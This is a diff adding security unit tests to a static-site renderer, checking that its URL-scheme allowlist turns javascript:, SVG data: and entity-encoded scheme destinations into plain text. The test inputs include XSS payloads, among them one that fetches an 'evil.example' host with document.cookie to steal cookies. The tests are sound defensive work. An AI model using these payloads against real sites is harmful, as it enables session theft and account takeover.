@@ -4,7 +4,7 @@
 import assert from 'node:assert/strict';
 import {
   parseSite, serializeSite, isSiteFile, renderSiteToHtml, parseParams, FRONTMATTER_KEY,
-  ctaButtonsHtml, linkButtonsHtml, bodyHtml, inlineHtml,
+  ctaButtonsHtml, linkButtonsHtml, bodyHtml, inlineHtml, ctaHtml, takeDropWarnings,
 } from './site-core.js';
 
 let passed = 0;
@@ -665,6 +665,136 @@ test('an image destination with a disallowed scheme renders no <img>', () => {
 test('a normal image destination is unaffected by the scheme check', () => {
   const html = inlineHtml('![alt](/images/x.png)');
   assert.equal(html, '<img class="st-img" src="/images/x.png" alt="alt" loading="lazy" decoding="async">');
+});
+
+// ── round 2: widened allowlist (P1-2) ─────────────────────────────────────────────────────────
+
+test('tel:/sms:/ftp: destinations are live links, not silently dropped', () => {
+  assert.equal(inlineHtml('[Call](tel:+1234567890)'), '<a href="tel:+1234567890">Call</a>');
+  assert.equal(inlineHtml('[SMS](sms:+1)'), '<a href="sms:+1">SMS</a>');
+  assert.equal(inlineHtml('[F](ftp://x.example/f)'), '<a href="ftp://x.example/f">F</a>');
+});
+
+test('a raster data: image src is allowed; data:image/svg+xml is not', () => {
+  const html = inlineHtml('![i](data:image/png;base64,iVBORw0KGgo=)');
+  assert.equal(html, '<img class="st-img" src="data:image/png;base64,iVBORw0KGgo=" alt="i" loading="lazy" decoding="async">');
+  const svg = inlineHtml('![i](data:image/svg+xml;base64,PHN2Zz4=)');
+  assert.ok(!svg.includes('<img'), 'svg+xml never becomes a live <img>');
+  assert.equal(svg, 'i');
+});
+
+test('data: is never allowed on a plain href, even an image MIME', () => {
+  const html = inlineHtml('[a](data:image/png;base64,iVBORw0KGgo=)');
+  assert.ok(!html.includes('<a '), 'data: on an anchor stays plain text');
+  assert.equal(html, 'a');
+});
+
+test('a disallowed destination records one build-time drop warning naming the page and scheme', () => {
+  takeDropWarnings(); // drain anything left by an earlier test
+  const src = '---\nsitetile-page: contact\ntitle: T\n---\n\n## H\n%% sitetile: prose %%\n[a](javascript:alert(1)\n';
+  renderSiteToHtml(parseSite(src));
+  const warnings = takeDropWarnings();
+  assert.equal(warnings.length, 1, 'exactly one warning for the one disallowed destination');
+  assert.equal(warnings[0].page, 'contact');
+  assert.equal(warnings[0].scheme, 'javascript:');
+  assert.deepEqual(takeDropWarnings(), [], 'the queue is drained after being read');
+});
+
+test('a newly-allowed scheme (tel:) records no drop warning', () => {
+  takeDropWarnings();
+  const src = '---\nsitetile-page: t\n---\n\n## H\n%% sitetile: prose %%\n[Call](tel:+1)\n';
+  renderSiteToHtml(parseSite(src));
+  assert.deepEqual(takeDropWarnings(), []);
+});
+
+// ── round 2: decode-once-escape-once (P2-1) ──────────────────────────────────────────────────
+
+test('a destination already carrying an entity-escaped ampersand is not double-escaped', () => {
+  const html = inlineHtml('[a](https://x/y?z=1&amp;w=2)');
+  assert.equal(html, '<a href="https://x/y?z=1&amp;w=2" target="_blank" rel="noopener">a</a>');
+});
+
+test('a destination with a literal ampersand still gets single-escaped (unchanged behavior)', () => {
+  const html = inlineHtml('[a](https://x/y?z=1&w=2)');
+  assert.equal(html, '<a href="https://x/y?z=1&amp;w=2" target="_blank" rel="noopener">a</a>');
+});
+
+test('an entity-encoded javascript: scheme is rejected by the scheme check itself', () => {
+  assert.equal(inlineHtml('[a](javascript&#58;alert1)'), 'a');
+  assert.equal(inlineHtml('[a](javascript&#x3a;alert1)'), 'a');
+});
+
+// ── round 2: wikilink embeds are scheme-checked too (P2-2) ───────────────────────────────────
+
+test('a ![[wikilink]] embed with a disallowed scheme renders no live element', () => {
+  const html = inlineHtml('![[javascript:alert(1)]]');
+  assert.ok(!html.includes('<img'), 'no <img>');
+  assert.ok(!html.includes('src='), 'no src attribute at all');
+});
+
+test('a ![[wikilink]] embed with a safe destination is unaffected', () => {
+  const html = inlineHtml('![[photos/cover.jpg]]');
+  assert.equal(html, '<img class="st-img" src="photos/cover.jpg" alt="cover.jpg" loading="lazy" decoding="async">');
+});
+
+// ── round 2: every href/src emitter routes through the shared policy (P1-1) ─────────────────
+
+test('ctaHtml: a disallowed cta= href degrades to a plain span, never a live link', () => {
+  const html = ctaHtml({ label: 'Go', href: 'javascript:alert(1)' }, 'st-hero-cta');
+  assert.equal(html, '<span class="st-hero-cta">Go</span>');
+});
+
+test('ctaButtonsHtml: a disallowed body-link button degrades to a plain span', () => {
+  // A destination containing `)` truncates RE_CTA_LINK's match (pre-existing, unrelated to this
+  // fix — see the round-1 review's P3-4) and this paragraph would then fail `onlyLinks` and be
+  // read as caption prose instead of a button at all; the backtick-call form avoids that so THIS
+  // test exercises the button path.
+  const { row } = ctaButtonsHtml(null, '[Donate](javascript:alert`1`)');
+  assert.ok(!row.includes('href='), 'no href attribute at all');
+  assert.ok(row.includes('<span class="st-cta-btn st-cta-btn-primary">Donate</span>'), 'label survives as plain text');
+});
+
+test('linkButtonsHtml: a disallowed hero/social button degrades to a plain span', () => {
+  const html = linkButtonsHtml([{ label: 'Go', href: 'javascript:alert(1)', primary: true }], 'st-hero');
+  assert.ok(!html.includes('href='));
+  assert.ok(html.includes('<span class="st-hero-btn st-hero-btn-primary">Go</span>'));
+});
+
+test('render: the P1-1 probe payload (CTA body link + hero cta= param) never reaches a live href', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Support us', '%% sitetile: cta %%',
+    '[Donate](javascript:fetch`//evil.example/`+document.cookie)', '',
+    '## Hero', '%% sitetile: hero cta="Go"→javascript:alert`1` %%',
+    'Lead text.', '',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'), 'no javascript: scheme survives anywhere in the page');
+  assert.ok(!/<a\b/.test(html), 'no anchor at all — both destinations degrade to plain text');
+  assert.ok(html.includes('Donate') && html.includes('Go'), 'labels stay visible');
+});
+
+test('render: a grid cell with a disallowed href stays a plain (non-link) cell', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Picks', '%% sitetile: grid cols=2 %%',
+    '### Bad →javascript:alert(1)', 'text.',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'));
+  assert.ok(html.includes('<div class="st-cell"><h3>Bad</h3>'), 'falls back to the plain-cell shape');
+});
+
+test('render: a hero standalone image with a disallowed src is dropped, not emitted live', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Hero', '%% sitetile: hero layout=split %%',
+    'Lead text.', '',
+    '![a](javascript:fetch`//evil.example/`)', '',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'));
+  assert.ok(!html.includes('<img'));
 });
 
 // ── people coral ───────────────────────────────────────────────────────────────────────────────
